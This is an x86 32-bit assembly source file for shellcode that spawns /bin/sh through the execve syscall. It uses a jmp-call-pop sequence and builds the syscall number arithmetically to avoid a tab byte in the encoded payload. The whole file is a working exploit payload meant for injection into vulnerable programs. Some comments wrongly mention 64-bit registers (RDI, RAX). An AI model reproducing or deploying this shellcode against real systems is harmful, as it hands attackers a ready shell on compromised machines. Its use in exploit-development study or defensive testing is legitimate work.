global _start

section .text

_start:

	jmp message		    ; push "/bin/sh" onto the stack

mystart:
	xor		eax, eax	; make eax - NULL
	push	eax			; push NULL onto stack
	pop 	edx 		; third parameter - NULL
	pop 	ebx 		; first parameter - "/bin/sh"
	push	eax			; push NULL onto stack
	mov 	eax, ebx	; copy RDI into RAX
	push	eax			; push "/bin/sh" onto the stack
	push	esp			; assign pointer to start of the stack
	pop 	ecx 		; second parameter - pointer to {"/bin/sh", NULL} 
	xor 	eax, eax	; clear RAX
	mov 	al, 0x5		; syscall number for __execve
	add 	al, 0x5
	inc		al			; syscall is 0xb, the addition is done because
						; 0xb is TAB in ASCII and will affect the shellcode
	int     0x80
	
	message:
	
	call 	mystart
	db 	"/bin/sh"
	
section .data
